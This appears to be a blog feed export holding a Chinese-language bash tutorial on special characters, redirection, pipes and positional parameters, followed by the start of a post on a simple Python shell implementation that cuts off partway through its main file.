class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! -w <span class="string">&apos;t.txt&apos;</span> ];</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    touch t.txt</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&apos;test text&apos;</span> &gt;&gt; t.txt</span><br><span class="line">cp t.{txt,back}</span><br></pre></td></tr></tbody></table></figure><p></p><p>2&#xFF09;&#x4EE3;&#x7801;&#x5757;<br>&#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x53C8;&#x88AB;&#x79F0;&#x4E3A;&#x5185;&#x90E8;&#x7EC4;&#xFF0C;&#x8FD9;&#x4E2A;&#x7ED3;&#x6784;&#x4E8B;&#x5B9E;&#x4E0A;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x533F;&#x540D;&#x51FD;&#x6570;&#xFF08;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x540D;&#x5B57;&#x7684;&#x51FD;&#x6570;&#xFF09;&#x3002;&#x7136;&#x800C;&#xFF0C;&#x4E0E;&#x201C;&#x6807;&#x51C6;&#x201D;&#x51FD;&#x6570;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x5728;&#x5176;&#x4E2D;&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x5BF9;&#x4E8E;&#x811A;&#x672C;&#x5176;&#x4ED6;&#x90E8;&#x5206;&#x7684;&#x4EE3;&#x7801;&#x6765;&#x8BF4;&#x8FD8;&#x662F;&#x53EF;&#x89C1;&#x7684;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=123</span><br><span class="line">{ a=321; }</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a = <span class="variable">$a</span>&quot;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>result:<br>a = 321</p><p>14.&#x4E2D;&#x62EC;&#x53F7;[]<br>1)&#x6761;&#x4EF6;&#x6D4B;&#x8BD5;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=5</span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$a</span> -lt 10 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;a: <span class="variable">$a</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&apos;a&gt;10&apos;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>2)&#x6570;&#x7EC4;&#x5143;&#x7D20;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">arr=(12 22 32)</span><br><span class="line">arr[0]=10</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">${arr[0]}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>15.&#x5C16;&#x62EC;&#x53F7;&lt;&gt;<br>&#x91CD;&#x5B9A;&#x5411;<br>test.sh &gt; filename&#xFF1A;&#x91CD;&#x5B9A;&#x5411;test.sh&#x7684;&#x8F93;&#x51FA;&#x5230;&#x6587;&#x4EF6; filename &#x4E2D;&#x3002;&#x5982;&#x679C; filename &#x5B58;&#x5728;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x4F1A;&#x88AB;&#x8986;&#x76D6;&#x3002;</p><p>test.sh &amp;&gt; filename&#xFF1A;&#x91CD;&#x5B9A;&#x5411; test.sh &#x7684; stdout&#xFF08;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF09;&#x548C; stderr&#xFF08;&#x6807;&#x51C6;&#x9519;&#x8BEF;&#xFF09;&#x5230; filename &#x4E2D;&#x3002;</p><p>test.sh &gt;&amp;2&#xFF1A;&#x91CD;&#x5B9A;&#x5411; test.sh &#x7684; stdout &#x5230; stderr &#x4E2D;&#x3002;</p><p>test.sh &gt;&gt; filename&#xFF1A;&#x628A; test.sh &#x7684;&#x8F93;&#x51FA;&#x8FFD;&#x52A0;&#x5230;&#x6587;&#x4EF6; filename &#x4E2D;&#x3002;&#x5982;&#x679C;filename &#x4E0D;&#x5B58;&#x5728;&#x7684;&#x8BDD;&#xFF0C;&#x5C06;&#x4F1A;&#x88AB;&#x521B;&#x5EFA;&#x3002;</p><p>16.&#x7AD6;&#x7EBF;&#xFF08;|&#xFF09;<br>&#x7BA1;&#x9053;<br>&#x5206;&#x6790;&#x524D;&#x8FB9;&#x547D;&#x4EE4;&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x5E76;&#x5C06;&#x8F93;&#x51FA;&#x4F5C;&#x4E3A;&#x540E;&#x8FB9;&#x547D;&#x4EE4;&#x7684;&#x8F93;&#x5165;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x4EA7;&#x751F;&#x547D;&#x4EE4;&#x94FE;&#x7684;&#x597D;&#x65B9;&#x6CD5;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">tr <span class="string">&apos;a-z&apos;</span> <span class="string">&apos;A-Z&apos;</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x73B0;&#x5728;&#x8BA9;&#x6211;&#x4EEC;&#x8F93;&#x9001;ls -l&#x7684;&#x8F93;&#x51FA;&#x5230;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x4E2D;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod 755 test26.sh</span><br><span class="line">$ ls -l | ./test26.sh</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8F93;&#x51FA;&#x7684;&#x5185;&#x5BB9;&#x5747;&#x53D8;&#x4E3A;&#x4E86;&#x5927;&#x5199;&#x5B57;&#x6BCD;&#x3002;</p><p>17.&#x7834;&#x6298;&#x53F7;-<br>1&#xFF09;&#x9009;&#x9879;&#xFF0C;&#x524D;&#x7F00;<br>&#x5728;&#x6240;&#x6709;&#x7684;&#x547D;&#x4EE4;&#x5185;&#x5982;&#x679C;&#x60F3;&#x4F7F;&#x7528;&#x9009;&#x9879;&#x53C2;&#x6570;&#x7684;&#x8BDD;,&#x524D;&#x8FB9;&#x90FD;&#x8981;&#x52A0;&#x4E0A;&#x201C;-&#x201D;&#x3002;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">a=5</span><br><span class="line">b=5</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$a</span>&quot;</span> -eq <span class="string">&quot;<span class="variable">$b</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;a is equal to b.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>2)&#x7528;&#x4E8E;&#x91CD;&#x5B9A;&#x5411;stdin&#x6216;stdout<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">BACKUPFILE=backup-$(date +%m-%d-%Y)</span><br><span class="line"><span class="comment"># &#x5728;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x4E2D;&#x5D4C;&#x5165;&#x65F6;&#x95F4;.</span></span><br><span class="line">archive=<span class="variable">${1:-$BACKUPFILE}</span></span><br><span class="line"><span class="comment">#  &#x5982;&#x679C;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;,</span></span><br><span class="line"><span class="comment">#  &#x90A3;&#x4E48;&#x5C06;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&quot;backup-MM-DD-YYYY.tar.gz&quot;.</span></span><br><span class="line"></span><br><span class="line">tar cvf - `find . -mtime -1 -<span class="built_in">type</span> f -<span class="built_in">print</span>` &gt; <span class="variable">$archive</span>.tar</span><br><span class="line">gzip <span class="variable">$archive</span>.tar</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Directory <span class="variable">$PWD</span> backed up in archive file \&quot;<span class="variable">$archive</span>.tar.gz\&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure><p></p><p>18.&#x6CE2;&#x6D6A;&#x53F7;~<br>&#x76EE;&#x5F55;<br>~ &#x8868;&#x793A; home &#x76EE;&#x5F55;&#x3002;</p><p>21.&#x53EA;&#x8BFB;&#x53D8;&#x91CF;<br>&#x4F7F;&#x7528; readonly &#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x5C06;&#x53D8;&#x91CF;&#x5B9A;&#x4E49;&#x4E3A;&#x53EA;&#x8BFB;&#x53D8;&#x91CF;&#xFF0C;&#x53EA;&#x8BFB;&#x53D8;&#x91CF;&#x7684;&#x503C;&#x4E0D;&#x80FD;&#x88AB;&#x6539;&#x53D8;&#x3002; &#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x5C1D;&#x8BD5;&#x66F4;&#x6539;&#x53EA;&#x8BFB;&#x53D8;&#x91CF;&#xFF0C;&#x7ED3;&#x679C;&#x62A5;&#x9519;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">myUrl=<span class="string">&quot;http://www.shiyanlou.com&quot;</span></span><br><span class="line"><span class="built_in">readonly</span> myUrl</span><br><span class="line">myUrl=<span class="string">&quot;http://www.shiyanlou.com&quot;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD0;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A;</p><p>/bin/sh: NAME: This variable is read only.</p><p>22.&#x7279;&#x6B8A;&#x53D8;&#x91CF;<br>1)&#x5C40;&#x90E8;&#x53D8;&#x91CF;<br>&#x8FD9;&#x79CD;&#x53D8;&#x91CF;&#x53EA;&#x6709;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x6216;&#x8005;&#x51FD;&#x6570;&#x4E2D;&#x624D;&#x53EF;&#x89C1;&#x3002;&#x540E;&#x9762;&#x7684;&#x5B9E;&#x9A8C;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BB2;&#x89E3;&#x3002;</p><p>2)&#x73AF;&#x5883;&#x53D8;&#x91CF;<br>&#x8FD9;&#x79CD;&#x53D8;&#x91CF;&#x5C06;&#x5F71;&#x54CD;&#x7528;&#x6237;&#x63A5;&#x53E3;&#x548C; shell &#x7684;&#x884C;&#x4E3A;&#x3002;</p><p>&#x5728;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x201C;&#x73AF;&#x5883;&#x201D;&#xFF0C;&#x8FD9;&#x4E2A;&#x73AF;&#x5883;&#x662F;&#x7531;&#x4E00;&#x7EC4;&#x53D8;&#x91CF;&#x7EC4;&#x6210;&#x7684;&#xFF0C;&#x8FD9;&#x4E9B;&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x6709;&#x8FDB;&#x7A0B;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5F15;&#x7528;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;shell &#x4E0E;&#x4E00;&#x4E2A;&#x4E00;&#x822C;&#x7684;&#x8FDB;&#x7A0B;&#x6CA1;&#x4EC0;&#x4E48;&#x533A;&#x522B;&#x3002;</p><p>3)&#x4F4D;&#x7F6E;&#x53C2;&#x6570;<br>&#x4ECE;&#x547D;&#x4EE4;&#x884C;&#x4F20;&#x9012;&#x5230;&#x811A;&#x672C;&#x7684;&#x53C2;&#x6570;&#xFF1A;$0&#xFF0C;$1&#xFF0C;$2&#xFF0C;$3&#x2026;</p><p>$0&#x5C31;&#x662F;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x81EA;&#x8EAB;&#x7684;&#x540D;&#x5B57;&#xFF0C;$1 &#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;$2 &#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;$3 &#x662F;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x662F;&#x7B2C;&#x56DB;&#x4E2A;&#x3002;$9 &#x4E4B;&#x540E;&#x7684;&#x4F4D;&#x7F6E;&#x53C2;&#x6570;&#x5C31;&#x5FC5;&#x987B;&#x7528;&#x5927;&#x62EC;&#x53F7;&#x62EC;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;${10}&#xFF0C;${11}&#xFF0C;${12}&#x3002;</p><p>$# &#xFF1A; &#x4F20;&#x9012;&#x5230;&#x811A;&#x672C;&#x7684;&#x53C2;&#x6570;&#x4E2A;&#x6570;<br>$<em> &#xFF1A; &#x4EE5;&#x4E00;&#x4E2A;&#x5355;&#x5B57;&#x7B26;&#x4E32;&#x663E;&#x793A;&#x6240;&#x6709;&#x5411;&#x811A;&#x672C;&#x4F20;&#x9012;&#x7684;&#x53C2;&#x6570;&#x3002;&#x4E0E;&#x4F4D;&#x7F6E;&#x53D8;&#x91CF;&#x4E0D;&#x540C;,&#x6B64;&#x9009;&#x9879;&#x53C2;&#x6570;&#x53EF;&#x8D85;&#x8FC7; 9&#x4E2A;<br>$$ &#xFF1A; &#x811A;&#x672C;&#x8FD0;&#x884C;&#x7684;&#x5F53;&#x524D;&#x8FDB;&#x7A0B; ID&#x53F7;<br>$! &#xFF1A; &#x540E;&#x53F0;&#x8FD0;&#x884C;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x8FDB;&#x7A0B; ID&#x53F7;<br>$@ &#xFF1A; &#x4E0E;$</em>&#x76F8;&#x540C;,&#x4F46;&#x662F;&#x4F7F;&#x7528;&#x65F6;&#x52A0;&#x5F15;&#x53F7;,&#x5E76;&#x5728;&#x5F15;&#x53F7;&#x4E2D;&#x8FD4;&#x56DE;&#x6BCF;&#x4E2A;&#x53C2;&#x6570;<br>$&#xFF1A; &#x663E;&#x793A;shell&#x4F7F;&#x7528;&#x7684;&#x5F53;&#x524D;&#x9009;&#x9879;,&#x4E0E; set&#x547D;&#x4EE4;&#x529F;&#x80FD;&#x76F8;&#x540C;<br>$? &#xFF1A; &#x663E;&#x793A;&#x6700;&#x540E;&#x547D;&#x4EE4;&#x7684;&#x9000;&#x51FA;&#x72B6;&#x6001;&#x3002; 0&#x8868;&#x793A;&#x6CA1;&#x6709;&#x9519;&#x8BEF;,&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x503C;&#x8868;&#x660E;&#x6709;&#x9519;&#x8BEF;&#x3002;<br>4.&#x4F4D;&#x7F6E;&#x53C2;&#x6570;&#x5B9E;&#x4F8B;<br>&#x8FD9;&#x4E2A;&#x5341;&#x5206;&#x91CD;&#x8981;&#xFF0C;&#x5728;&#x6211;&#x4EEC;&#x8FD0;&#x884C;&#x4E00;&#x5957;&#x811A;&#x672C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x662F;&#x9700;&#x8981;&#x53C2;&#x6570;&#x7684;&#xFF0C;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x6559;&#x5927;&#x5BB6;&#x5982;&#x4F55;&#x83B7;&#x53D6;&#x53C2;&#x6570;</p><p>$ vim test30.sh<br>&#x8F93;&#x5165;&#x4EE3;&#x7801;&#xFF08;&#x4E2D;&#x6587;&#x7686;&#x4E3A;&#x6CE8;&#x91CA;&#xFF0C;&#x4E0D;&#x7528;&#x8F93;&#x5165;&#xFF09;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x4F5C;&#x4E3A;&#x7528;&#x4F8B;, &#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x81F3;&#x5C11;&#x9700;&#x8981;10&#x4E2A;&#x53C2;&#x6570;, &#x6BD4;&#x5982;:</span></span><br><span class="line"><span class="comment"># bash test.sh 1 2 3 4 5 6 7 8 9 10</span></span><br><span class="line">MINPARAMS=10</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;The name of this script is \&quot;<span class="variable">$0</span>\&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;The name of this script is \&quot;`basename <span class="variable">$0</span>`\&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]              <span class="comment"># &#x6D4B;&#x8BD5;&#x53D8;&#x91CF;&#x88AB;&#x5F15;&#x7528;.</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Parameter #1 is <span class="variable">$1</span>&quot;</span>  <span class="comment"># &#x9700;&#x8981;&#x5F15;&#x7528;&#x624D;&#x80FD;&#x591F;&#x8F6C;&#x4E49;&quot;#&quot;</span></span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$2</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Parameter #2 is <span class="variable">$2</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">${10}</span>&quot;</span> ]  <span class="comment"># &#x5927;&#x4E8E;$9&#x7684;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x7528;{}&#x62EC;&#x8D77;&#x6765;.</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Parameter #10 is <span class="variable">${10}</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-----------------------------------&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;All the command-line parameters are: &quot;</span>$*<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -lt <span class="string">&quot;<span class="variable">$MINPARAMS</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"> <span class="built_in">echo</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;This script needs at least <span class="variable">$MINPARAMS</span> command-line arguments!&quot;</span></span><br><span class="line"><span class="keyword">fi</span>  </span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> bash </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Simple shell implementation based on Python</title>
      <link href="/2018/10/21/Simple-shell-implementation-based-on-Python/"/>
      <url>/2018/10/21/Simple-shell-implementation-based-on-Python/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1473041746166.png" alt=""></p><a id="more"></a><p>&#x6587;&#x4EF6;&#x7ED3;&#x6784;&#xFF1A;<br>|&#x2014;-shell.py<br>|<br>|     |&#x2014;-cd.py<br>|     |&#x2014;-constants.py<br>|&#x2014;-|&#x2014;-exit.py<br>     |&#x2014;-getenv.py<br>     |&#x2014;-history.py<br>     |&#x2014;-<strong>init</strong>.py</p><p>shell.py:<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> shlex</span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">from</span> func <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">built_in_cmds = {}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tokenize</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> shlex.split(string)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess</span><span class="params">(tokens)</span>:</span></span><br><span class="line">    processed_token = []</span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> tokens:</span><br><span class="line">        <span class="keyword">if</span> token.startswith(<span class="string">&apos;$&apos;</span>):</span><br><span class="line">            processed_token.append(os.getenv(token[<span class="number">1</span>:]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            processed_token.append(token)</span><br><span class="line">    <span class="keyword">return</span> processed_token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler_kill</span><span class="params">(signum, frame)</span>:</span></span><br><span class="line">    <span class="keyword">raise</span> OSError(<span class="string">&quot;Killed!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(cmd_tokens)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(HISTORY_PATH, <span class="string">&apos;a&apos;</span>) <span class="keyword">as</span> history_file:</span><br><span class="line">        history_file.write(<span class="string">&apos; &apos;</span>.join(cmd_tokens) + os.linesep)</span><br><span class="line">    <span class="keyword">if</span> cmd_tokens:</span><br><span class="line">        cmd_name = cmd_tokens[<span class="number">0</span>]</span><br><span class="line">        cmd_args = cmd_tokens[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> cmd_name <span class="keyword">in</span> built_in_cmds:</span><br><span class="line">            <span class="keyword">return</span> built_in_cmds[cmd_name](cmd_args)</span><br><span class="line">        signal.signal(signal.SIGINT, handler_kill)</span><br><span class="line">        <span class="keyword">if</span> platform.system() != <span class="string">&quot;Windows&quot;</span>:</span><br><span class="line">            p = subprocess.Popen(cmd_tokens)</span><br><span class="line">            p.communicate()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            command = <span class="string">&quot;&quot;</span></span><br><span class="line">            command = <span class="string">&apos; &apos;</span>.join(cmd_tokens)</span><br><span class="line">            os.system(command)</span><br><span class="line">    <span class="keyword">return</span> SHELL_STATUS_RUN</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_cmd_prompt</span><span class="params">()</span>:</span></span><br><span class="line">    user = getpass.getuser()</span><br><span class="line">    hostname = socket.gethostname()</span><br><span class="line">    cwd = os.getcwd()</span><br><span class="line">    base_dir = os.path.basename(cwd)</span><br><span class="line">    home_dir = os.path.expanduser(<span class="string">&apos;~&apos;</span>)</span><br><span class="line">    <span class="keyword">if</span> cwd == home_dir:</span><br><span class="line">        base_dir = <span class="string">&apos;~&apos;</span></span><br><span class="line">    <span class="keyword">if</span> platform.system() != <span class="string">&apos;Windows&apos;</span>:</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;[\033[1;33m%s\033[0;0m@%s \033[1;36m%s\033[0;0m] $ &quot;</span> % (user, hostname, base_dir))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;[%s@%s %s]$ &quot;</span> % (user, hostname, base_dir))</span><br><span class="line">    